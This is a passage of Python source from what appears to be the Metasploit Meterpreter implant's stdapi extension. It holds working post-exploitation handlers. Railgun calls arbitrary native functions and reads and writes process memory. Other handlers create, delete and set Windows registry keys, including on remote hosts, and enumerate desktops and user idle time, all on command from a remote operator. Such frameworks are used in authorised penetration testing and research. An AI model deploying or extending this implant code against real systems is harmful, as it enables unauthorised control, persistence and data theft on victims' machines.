    WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, size_t, ctypes.POINTER(size_t)]
    size = len(data)
    buff = bytes_to_ctarray(data)
    written = size_t()
    result = WriteProcessMemory(handle, address, ctypes.byref(buff), size, ctypes.byref(written))
    if not result:
        return None
    return written.value

@register_function_if(sys.platform == 'darwin' or sys.platform.startswith('linux') or has_windll)
def stdapi_railgun_api(request, response):
    size_out = packet_get_tlv(request, TLV_TYPE_RAILGUN_SIZE_OUT)['value']
    stack_blob = packet_get_tlv(request, TLV_TYPE_RAILGUN_STACKBLOB)['value']
    buff_blob_in = packet_get_tlv(request, TLV_TYPE_RAILGUN_BUFFERBLOB_IN)['value']
    buff_blob_inout = packet_get_tlv(request, TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT)['value']
    lib_name = packet_get_tlv(request, TLV_TYPE_RAILGUN_DLLNAME)['value']
    func_name = packet_get_tlv(request, TLV_TYPE_RAILGUN_FUNCNAME)['value']
    call_conv = packet_get_tlv(request, TLV_TYPE_RAILGUN_CALLCONV).get('value', ('stdcall' if has_windll else 'cdecl'))

    buff_blob_in = bytes_to_ctarray(buff_blob_in)
    buff_blob_out = (ctypes.c_byte * size_out)()
    buff_blob_inout = bytes_to_ctarray(buff_blob_inout)

    if ctypes.sizeof(ctypes.c_void_p) == 4:
        native = ctypes.c_uint32
        fmt = 'II'
    elif ctypes.sizeof(ctypes.c_void_p) == 8:
        native = ctypes.c_uint64
        fmt = 'QQ'
    else:
        raise RuntimeError('unknown sizeof(void *)')
    fmt_size = struct.calcsize(fmt)

    if call_conv.lower() == 'cdecl':
        func_type = ctypes.CFUNCTYPE
    elif call_conv.lower() == 'stdcall' and hasattr(ctypes, 'WINFUNCTYPE'):
        func_type = ctypes.WINFUNCTYPE
    else:
        raise ValueError('unknown calling convention')

    call_args = []
    func_args = []
    for pos in range(0, len(stack_blob), fmt_size):
        arg_type, arg = struct.unpack(fmt, stack_blob[pos:pos + fmt_size])
        if arg_type == 0:    # literal
            call_args.append(arg)
            func_args.append(native)
        elif arg_type == 1:  # relative to in
            call_args.append(byref_at(buff_blob_in, arg))
            func_args.append(ctypes.c_void_p)
        elif arg_type == 2:  # relative to out
            call_args.append(byref_at(buff_blob_out, arg))
            func_args.append(ctypes.c_void_p)
        elif arg_type == 3:  # relative to inout
            call_args.append(byref_at(buff_blob_inout, arg))
            func_args.append(ctypes.c_void_p)
        else:
            raise ValueError('unknown argument type: ' + str(arg_type))

    debug_print('[*] railgun calling: ' + lib_name + '!' + func_name)
    prototype = func_type(native, *func_args)
    if sys.platform == 'darwin' or sys.platform.startswith('linux'):
        p_errno = ctypes.cast(libc.errno, ctypes.POINTER(ctypes.c_int))
        errno = p_errno.contents
        last_error = ctypes.c_int(0)
        p_errno.contents = last_error
        func = prototype((func_name, ctypes.CDLL(ctypes.util.find_library(lib_name) or lib_name)))
        result = func(*call_args)
        p_errno.contents = errno
        last_error = last_error.value
        libc.strerror.argtypes = [ctypes.c_int]
        libc.strerror.restype = ctypes.c_char_p
        error_message = libc.strerror(last_error)
    elif has_windll:
        func = prototype((func_name, ctypes.WinDLL(lib_name)))
        result = func(*call_args)
        GetModuleHandle = ctypes.windll.kernel32.GetModuleHandleA
        GetModuleHandle.argtypes = [ctypes.c_char_p]
        GetModuleHandle.restype = ctypes.c_void_p
        lib_handle = GetModuleHandle(bytes(lib_name, 'UTF-8'))
        last_error = ctypes.windll.kernel32.GetLastError()
        error_message = _win_format_message(lib_handle, last_error)
        if error_message is None:
            if last_error == ERROR_SUCCESS:
                error_message = 'The operation completed successfully.'
            else:
                error_message = 'FormatMessage failed to retrieve the error for value ' + hex(last_error) + '.'
    else:
        raise RuntimeError('unknown platform')

    response += tlv_pack(TLV_TYPE_RAILGUN_BACK_ERR, last_error)
    response += tlv_pack(TLV_TYPE_RAILGUN_BACK_MSG, error_message)
    response += tlv_pack(TLV_TYPE_RAILGUN_BACK_RET, result)
    response += tlv_pack(TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_OUT, ctarray_to_bytes(buff_blob_out))
    response += tlv_pack(TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_INOUT, ctarray_to_bytes(buff_blob_inout))
    return ERROR_SUCCESS, response

@register_function_if(sys.platform == 'darwin' or sys.platform.startswith('linux') or has_windll)
def stdapi_railgun_api_multi(request, response):
    for group_tlv in packet_enum_tlvs(request, tlv_type=TLV_TYPE_RAILGUN_MULTI_GROUP):
        group_result = stdapi_railgun_api(group_tlv['value'], bytes())[1]
        response += tlv_pack(TLV_TYPE_RAILGUN_MULTI_GROUP, group_result)
    return ERROR_SUCCESS, response

@register_function_if(sys.platform == 'darwin' or sys.platform.startswith('linux') or has_windll)
def stdapi_railgun_memread(request, response):
    address = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_ADDRESS)['value']
    length = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_LENGTH)['value']
    debug_print('[*] railgun reading ' + str(length) + ' bytes from 0x' + hex(address))
    if sys.platform.startswith('darwin'):
        result = _osx_memread(address, length)
    elif sys.platform.startswith('linux'):
        result = _linux_memread(address, length)
    elif has_windll:
        result = _win_memread(address, length)
        if result is None:
            return error_result_windows(), response
    else:
        return ERROR_FAILURE, response
    response += tlv_pack(TLV_TYPE_RAILGUN_MEM_DATA, result)
    return ERROR_SUCCESS, response

@register_function_if(sys.platform == 'darwin' or sys.platform.startswith('linux') or has_windll)
def stdapi_railgun_memwrite(request, response):
    address = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_ADDRESS)['value']
    data = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_DATA)['value']
    length = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_LENGTH)['value']
    debug_print('[*] railgun writing ' + str(len(data)) + ' bytes to 0x' + hex(address))
    if sys.platform.startswith('darwin'):
        result = _osx_memwrite(address, data)
    elif sys.platform.startswith('linux'):
        result = _linux_memwrite(address, data)
    elif has_windll:
        result = _win_memwrite(address, data)
        if result is None:
            return error_result_windows(), response
    else:
        return ERROR_FAILURE, response
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_registry_close_key(request, response):
    _wreg_close_key(packet_get_tlv(request, TLV_TYPE_HKEY)['value'])
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_registry_create_key(request, response):
    root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
    base_key = packet_get_tlv(request, TLV_TYPE_BASE_KEY)['value']
    base_key = ctypes.create_string_buffer(bytes(base_key, 'UTF-8'))
    permission = packet_get_tlv(request, TLV_TYPE_PERMISSION).get('value', winreg.KEY_ALL_ACCESS)
    res_key = ctypes.c_void_p()
    if ctypes.windll.advapi32.RegCreateKeyExA(root_key, ctypes.byref(base_key), 0, None, 0, permission, None, ctypes.byref(res_key), None) != ERROR_SUCCESS:
        return error_result_windows(), response
    response += tlv_pack(TLV_TYPE_HKEY, res_key.value)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_registry_delete_key(request, response):
    root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
    base_key = packet_get_tlv(request, TLV_TYPE_BASE_KEY)['value']
    base_key = ctypes.create_string_buffer(bytes(base_key, 'UTF-8'))
    flags = packet_get_tlv(request, TLV_TYPE_FLAGS)['value']
    if (flags & DELETE_KEY_FLAG_RECURSIVE):
        result = ctypes.windll.shlwapi.SHDeleteKeyA(root_key, ctypes.byref(base_key))
    else:
        result = ctypes.windll.advapi32.RegDeleteKeyA(root_key, ctypes.byref(base_key))
    return result, response

@register_function_if(has_windll)
def stdapi_registry_delete_value(request, response):
    root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
    value_name = packet_get_tlv(request, TLV_TYPE_VALUE_NAME)['value']
    value_name = ctypes.create_string_buffer(bytes(value_name, 'UTF-8'))
    result = ctypes.windll.advapi32.RegDeleteValueA(root_key, ctypes.byref(value_name))
    return result, response

def _wreg_enum_key(request, response, hkey):
    ERROR_MORE_DATA = 0xea
    ERROR_NO_MORE_ITEMS = 0x0103
    name = (ctypes.c_char * 4096)()
    index = 0
    tries = 0
    while True:
        result = ctypes.windll.advapi32.RegEnumKeyA(hkey, index, name, ctypes.sizeof(name))
        if result == ERROR_MORE_DATA:
            if tries > 3:
                break
            name = (ctypes.c_char * (ctypes.sizeof(name) * 2))
            tries += 1
            continue
        elif result == ERROR_NO_MORE_ITEMS:
            result = ERROR_SUCCESS
            break
        elif result != ERROR_SUCCESS:
            break
        tries = 0
        response += tlv_pack(TLV_TYPE_KEY_NAME, ctypes.string_at(name))
        index += 1
    return result, response

@register_function_if(has_windll)
def stdapi_registry_enum_key(request, response):
    hkey = packet_get_tlv(request, TLV_TYPE_HKEY)['value']
    return _wreg_enum_key(request, response, hkey)

@register_function_if(has_windll)
def stdapi_registry_enum_key_direct(request, response):
    err, hkey = _wreg_open_key(request)
    if err != ERROR_SUCCESS:
        return err, response
    ret = _wreg_enum_key(request, response, hkey)
    _wreg_close_key(hkey)
    return ret

def _wreg_enum_value(request, response, hkey):
    ERROR_MORE_DATA = 0xea
    ERROR_NO_MORE_ITEMS = 0x0103
    name = (ctypes.c_char * 4096)()
    name_sz = ctypes.c_uint32()
    index = 0
    tries = 0
    while True:
        name_sz.value = ctypes.sizeof(name)
        result = ctypes.windll.advapi32.RegEnumValueA(hkey, index, name, ctypes.byref(name_sz), None, None, None, None)
        if result == ERROR_MORE_DATA:
            if tries > 3:
                break
            name = (ctypes.c_char * (ctypes.sizeof(name) * 3))
            tries += 1
            continue
        elif result == ERROR_NO_MORE_ITEMS:
            result = ERROR_SUCCESS
            break
        elif result != ERROR_SUCCESS:
            break
        tries = 0
        response += tlv_pack(TLV_TYPE_VALUE_NAME, ctypes.string_at(name))
        index += 1
    return result, response

@register_function_if(has_windll)
def stdapi_registry_enum_value(request, response):
    hkey = packet_get_tlv(request, TLV_TYPE_HKEY)['value']
    return _wreg_enum_value(request, response, hkey)

@register_function_if(has_windll)
def stdapi_registry_enum_value_direct(request, response):
    err, hkey = _wreg_open_key(request)
    if err != ERROR_SUCCESS:
        return err, response
    ret = _wreg_enum_value(request, response, hkey)
    _wreg_close_key(hkey)
    return ret

@register_function_if(has_windll)
def stdapi_registry_load_key(request, response):
    root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)
    sub_key = packet_get_tlv(request, TLV_TYPE_BASE_KEY)
    file_name = packet_get_tlv(request, TLV_TYPE_FILE_PATH)
    result = ctypes.windll.advapi32.RegLoadKeyA(root_key, sub_key, file_name)
    return result, response

def _wreg_close_key(hkey):
    ctypes.windll.advapi32.RegCloseKey(hkey)

def _wreg_open_key(request, permission=None):
    root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
    root_key_names = {
        winreg.HKEY_CLASSES_ROOT & 0xffffffff: 'HKCR',
        winreg.HKEY_CURRENT_USER & 0xffffffff: 'HKCU',
        winreg.HKEY_LOCAL_MACHINE & 0xffffffff: 'HKLM',
        winreg.HKEY_USERS & 0xffffffff: 'HKU',
        winreg.HKEY_PERFORMANCE_DATA & 0xffffffff: 'HKPD',
        winreg.HKEY_CURRENT_CONFIG & 0xffffffff: 'HKCC'
    }
    root_key_name = root_key_names.get(root_key, 'HK??')
    base_key = packet_get_tlv(request, TLV_TYPE_BASE_KEY)['value']
    debug_print('[*] opening registry key: ' + root_key_name + '\\' + unicode(base_key))
    base_key = ctypes.create_string_buffer(bytes(base_key, 'UTF-8'))
    if permission is None:
        permission = packet_get_tlv(request, TLV_TYPE_PERMISSION).get('value', winreg.KEY_ALL_ACCESS)
    handle_id = ctypes.c_void_p()
    result = ctypes.windll.advapi32.RegOpenKeyExA(root_key, ctypes.byref(base_key), 0, permission, ctypes.byref(handle_id))
    if result != ERROR_SUCCESS:
        return error_result_windows(result), 0
    return ERROR_SUCCESS, handle_id.value

def _wreg_query_value(request, response, hkey):
    value_name = packet_get_tlv(request, TLV_TYPE_VALUE_NAME)['value']
    value_name = ctypes.create_string_buffer(bytes(value_name, 'UTF-8'))
    value_type = ctypes.c_uint32()
    value_type.value = 0
    value_data = (ctypes.c_ubyte * 4096)()
    value_data_sz = ctypes.c_uint32()
    value_data_sz.value = ctypes.sizeof(value_data)
    result = ctypes.windll.advapi32.RegQueryValueExA(hkey, ctypes.byref(value_name), 0, ctypes.byref(value_type), value_data, ctypes.byref(value_data_sz))
    if result == ERROR_SUCCESS:
        response += tlv_pack(TLV_TYPE_VALUE_TYPE, value_type.value)
        if value_type.value == winreg.REG_SZ:
            response += tlv_pack(TLV_TYPE_VALUE_DATA, ctypes.string_at(value_data) + NULL_BYTE)
        elif value_type.value == winreg.REG_DWORD:
            value = value_data[:4]
            value.reverse()
            if sys.version_info[0] < 3:
                value = ''.join(map(chr, value))
            else:
                value = bytes(value)
            response += tlv_pack(TLV_TYPE_VALUE_DATA, value)
        else:
            response += tlv_pack(TLV_TYPE_VALUE_DATA, ctypes.string_at(value_data, value_data_sz.value))
        return ERROR_SUCCESS, response
    return error_result_windows(result), response

def _wreg_set_value(request, response, hkey):
    value_name = packet_get_tlv(request, TLV_TYPE_VALUE_NAME)['value']
    value_name = ctypes.create_string_buffer(bytes(value_name, 'UTF-8'))
    value_type = packet_get_tlv(request, TLV_TYPE_VALUE_TYPE)['value']
    value_data = packet_get_tlv(request, TLV_TYPE_VALUE_DATA)['value']
    result = ctypes.windll.advapi32.RegSetValueExA(hkey, ctypes.byref(value_name), 0, value_type, value_data, len(value_data))
    if result == ERROR_SUCCESS:
        return ERROR_SUCCESS, response
    return error_result_windows(result), response

@register_function_if(has_windll)
def stdapi_registry_check_key_exists(request, response):
    err, hkey = _wreg_open_key(request, permission=winreg.KEY_QUERY_VALUE)
    if err == ERROR_SUCCESS:
        _wreg_close_key(hkey)
        response += tlv_pack(TLV_TYPE_BOOL, True)
    else:
        response += tlv_pack(TLV_TYPE_BOOL, False)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_registry_open_key(request, response):
    err, hkey = _wreg_open_key(request)
    if err != ERROR_SUCCESS:
        return err, response
    response += tlv_pack(TLV_TYPE_HKEY, hkey)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_registry_open_remote_key(request, response):
    target_host = packet_get_tlv(request, TLV_TYPE_TARGET_HOST)['value']
    root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
    result_key = ctypes.c_void_p()
    if ctypes.windll.advapi32.RegConnectRegistry(target_host, root_key, ctypes.byref(result_key)) != ERROR_SUCCESS:
        return error_result_windows(), response
    response += tlv_pack(TLV_TYPE_HKEY, result_key.value)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_registry_query_class(request, response):
    hkey = packet_get_tlv(request, TLV_TYPE_HKEY)['value']
    value_data = (ctypes.c_char * 4096)()
    value_data_sz = ctypes.c_uint32()
    value_data_sz.value = ctypes.sizeof(value_data)
    if ctypes.windll.advapi32.RegQueryInfoKeyA(hkey, value_data, ctypes.byref(value_data_sz), None, None, None, None, None, None, None, None, None) != ERROR_SUCCESS:
        return error_result_windows(), response
    response += tlv_pack(TLV_TYPE_VALUE_DATA, ctypes.string_at(value_data))
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_registry_query_value(request, response):
    hkey = packet_get_tlv(request, TLV_TYPE_HKEY)['value']
    return _wreg_query_value(request, response, hkey)

@register_function_if(has_windll)
def stdapi_registry_query_value_direct(request, response):
    err, hkey = _wreg_open_key(request)
    if err != ERROR_SUCCESS:
        return error_result_windows(err), response
    ret = _wreg_query_value(request, response, hkey)
    _wreg_close_key(hkey)
    return ret

@register_function_if(has_windll)
def stdapi_registry_set_value(request, response):
    hkey = packet_get_tlv(request, TLV_TYPE_HKEY)['value']
    return _wreg_set_value(request, response, hkey)

@register_function_if(has_windll)
def stdapi_registry_set_value_direct(request, response):
    err, hkey = _wreg_open_key(request)
    if err != ERROR_SUCCESS:
        return error_result_windows(err), response
    ret = _wreg_set_value(request, response, hkey)
    _wreg_close_key(hkey)
    return ret

@register_function_if(has_windll)
def stdapi_registry_unload_key(request, response):
    root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
    base_key = packet_get_tlv(request, TLV_TYPE_BASE_KEY)['value']
    result = ctypes.windll.advapi32.RegUnLoadKeyA(root_key, base_key)
    return result, response

@register_function_if(has_windll)
def stdapi_ui_get_idle_time(request, response):
    GetLastInputInfo = ctypes.windll.user32.GetLastInputInfo
    GetLastInputInfo.argtypes = [ctypes.c_void_p]
    GetLastInputInfo.restype = ctypes.c_int8
    info = LASTINPUTINFO()
    info.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if not GetLastInputInfo(ctypes.byref(info)):
        return error_result_windows(), response
    GetTickCount = ctypes.windll.kernel32.GetTickCount
    GetTickCount.restype = ctypes.c_uint32
    idle_time = (GetTickCount() - info.dwTime) / 1000
    response += tlv_pack(TLV_TYPE_IDLE_TIME, idle_time)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_ui_desktop_enum(request, response):
    response_parts = []
    if ctypes.sizeof(ctypes.c_long) == ctypes.sizeof(ctypes.c_void_p):
        LPARAM = ctypes.c_long
    elif ctypes.sizeof(ctypes.c_longlong) == ctypes.sizeof(ctypes.c_void_p):
        LPARAM = ctypes.c_longlong

    DESKTOPENUMPROCA = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_char_p, LPARAM)
    EnumDesktopsA = ctypes.windll.user32.EnumDesktopsA
    EnumDesktopsA.argtypes = [ctypes.c_void_p, DESKTOPENUMPROCA, LPARAM]
    EnumDesktopsA.restype = ctypes.c_long

    WINSTAENUMPROCA = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_char_p, LPARAM)
    EnumWindowStationsA = ctypes.windll.user32.EnumWindowStationsA
    EnumWindowStationsA.argtypes = [WINSTAENUMPROCA, LPARAM]
    EnumWindowStationsA.restype = ctypes.c_long

    OpenWindowStationA = ctypes.windll.user32.OpenWindowStationA
    OpenWindowStationA.argtypes = [ctypes.c_char_p, ctypes.c_long, ctypes.c_bool]
    OpenWindowStationA.restype = ctypes.c_void_p

    CloseWindowStation = ctypes.windll.user32.CloseWindowStation
    CloseWindowStation.argtypes = [ctypes.c_void_p]
    CloseWindowStation.restype = ctypes.c_long

    GetCurrentProcessId = ctypes.windll.kernel32.GetCurrentProcessId
    GetCurrentProcessId.restype = ctypes.c_ulong

    GetProcAddress = ctypes.windll.kernel32.GetProcAddress
    GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    GetProcAddress.restype = ctypes.c_void_p

    def get_session_id(pid):
        dwSessionId = ctypes.c_ulong(0)

        ProcessIdToSessionId = ctypes.windll.kernel32.ProcessIdToSessionId
        ProcessIdToSessionId.argtypes = [ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
        ProcessIdToSessionId.restype = ctypes.c_bool

        if not ProcessIdToSessionId(ctypes.c_ulong(pid), ctypes.byref(dwSessionId)):
            dwSessionId = ctypes.c_ulong(-1)

        return dwSessionId


    def desktop_enumdesktops_callback(response_parts, session_id, station_name, lpszDesktop, lParam):
        if not station_name or not lpszDesktop:
            return True

        entry  = bytes()
        entry += tlv_pack(TLV_TYPE_DESKTOP_SESSION, session_id)
        entry += tlv_pack(TLV_TYPE_DESKTOP_STATION, station_name)
        entry += tlv_pack(TLV_TYPE_DESKTOP_NAME, lpszDesktop.decode())

        response_parts.append(tlv_pack(TLV_TYPE_DESKTOP, entry))

        return True

    @WINSTAENUMPROCA
    def desktop_enumstations_callback(lpszWindowStation, lParam):
        hWindowStation = OpenWindowStationA(lpszWindowStation, False, MAXIMUM_ALLOWED)
        if not hWindowStation:
            return True

        callback = functools.partial(desktop_enumdesktops_callback, response_parts)
        session_id = get_session_id(GetCurrentProcessId()).value
        station_name = lpszWindowStation.decode()
        callback = functools.partial(desktop_enumdesktops_callback, response_parts, session_id, station_name)
        callback = DESKTOPENUMPROCA(callback)
        EnumDesktopsA(hWindowStation, callback, 0)

        if hWindowStation:
            CloseWindowStation(hWindowStation)

        return True

    success = EnumWindowStationsA(desktop_enumstations_callback, 0)
    if not success:
        return error_result_windows(), response

    response += bytes().join(response_parts)

    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_ui_desktop_get(request, response):
    UOI_NAME = 2

    GetCurrentProcessId = ctypes.windll.kernel32.GetCurrentProcessId
    GetCurrentProcessId.restype = ctypes.c_ulong

    GetProcessWindowStation = ctypes.windll.user32.GetProcessWindowStation
    GetProcessWindowStation.restype = ctypes.c_void_p

    GetUserObjectInformationA = ctypes.windll.user32.GetUserObjectInformationA
    GetUserObjectInformationA.argtypes = [ctypes.c_void_p, ctypes.c_int32, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
    GetUserObjectInformationA.restype = ctypes.c_bool

    GetCurrentThreadId = ctypes.windll.kernel32.GetCurrentThreadId
    GetCurrentThreadId.restype = ctypes.c_ulong

    GetThreadDesktop = ctypes.windll.user32.GetThreadDesktop
    GetThreadDesktop.argtypes = [ctypes.c_ulong]
    GetThreadDesktop.restype = ctypes.c_void_p

    ProcessIdToSessionId = ctypes.windll.kernel32.ProcessIdToSessionId
    ProcessIdToSessionId.argtypes = [ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
    ProcessIdToSessionId.restype = ctypes.c_bool

    dwSessionId = ctypes.c_ulong(0)
    if not ProcessIdToSessionId(GetCurrentProcessId(), ctypes.byref(dwSessionId)):
        return error_result_windows(), response

    station_name = ctypes.create_string_buffer(bytes(), 256)
    success = GetUserObjectInformationA(GetProcessWindowStation(), UOI_NAME, ctypes.byref(station_name), 256, None)
    if not success:
        return error_result_windows(), response

    desktop_name = ctypes.create_string_buffer(bytes(), 256)
    success = GetUserObjectInformationA(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, ctypes.byref(desktop_name), 256, None)
    if not success:
        return error_result_windows(), response

    response += tlv_pack(TLV_TYPE_DESKTOP_SESSION, dwSessionId.value)
    response += tlv_pack(TLV_TYPE_DESKTOP_STATION, station_name.value.decode())
    response += tlv_pack(TLV_TYPE_DESKTOP_NAME, desktop_name.value.decode())
    return ERROR_SUCCESS, response

@register_function_if(has_termios and has_fcntl)
def stdapi_sys_process_set_term_size(request, response):
    channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
    rows = packet_get_tlv(request, TLV_TYPE_TERMINAL_ROWS)['value']
    columns = packet_get_tlv(request, TLV_TYPE_TERMINAL_COLUMNS)['value']
    if channel_id in meterpreter.interact_channels:
        proc_h = meterpreter.channels[channel_id].proc_h
        winsize = struct.pack("HHHH", rows, columns, 0, 0)
        fcntl.ioctl(proc_h.stdin, termios.TIOCSWINSZ, winsize)
    else:
        return ERROR_FAILURE, response
    return ERROR_SUCCESS, response
